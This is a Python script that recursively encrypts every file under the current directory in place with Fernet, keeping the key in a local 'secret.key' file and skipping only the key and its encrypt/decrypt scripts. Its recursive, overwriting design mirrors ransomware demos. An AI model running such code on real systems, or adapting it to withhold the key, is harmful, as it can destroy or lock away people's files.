import os
from cryptography.fernet import Fernet

# === CONFIGURATION ===
FOLDER_PATH = "."  # Current directory
KEY_FILE = "secret.key"
SKIP_FILES = {KEY_FILE, "encrypt.py", "decrypt.py"}

# === Load or Generate Encryption Key ===
def load_or_generate_key(key_file):
    if os.path.exists(key_file):
        with open(key_file, "rb") as f:
            key = f.read()
    else:
        key = Fernet.generate_key()
        with open(key_file, "wb") as f:
            f.write(key)
    return key

# === Encrypt All Files Except Skipped Ones (Recursive) ===
def encrypt_files(folder_path, fernet):
    for root, _, files in os.walk(folder_path):
        for filename in files:
            if filename in SKIP_FILES:
                print(f"[i] Skipped: {os.path.join(root, filename)}")
                continue

            file_path = os.path.join(root, filename)

            if os.path.isfile(file_path):
                try:
                    with open(file_path, "rb") as file:
                        data = file.read()

                    encrypted_data = fernet.encrypt(data)

                    with open(file_path, "wb") as file:
                        file.write(encrypted_data)

                    print(f"[+] Encrypted: {file_path}")
                except Exception as e:
                    print(f"[!] Failed to encrypt {file_path}: {e}")

# === MAIN ===
if __name__ == "__main__":
    try:
        key = load_or_generate_key(KEY_FILE)
        fernet = Fernet(key)

        encrypt_files(FOLDER_PATH, fernet)
        print("\n✅ Encryption complete. All files encrypted (except skipped ones).")
    except Exception as err:
        print(f"[X] Error: {err}")
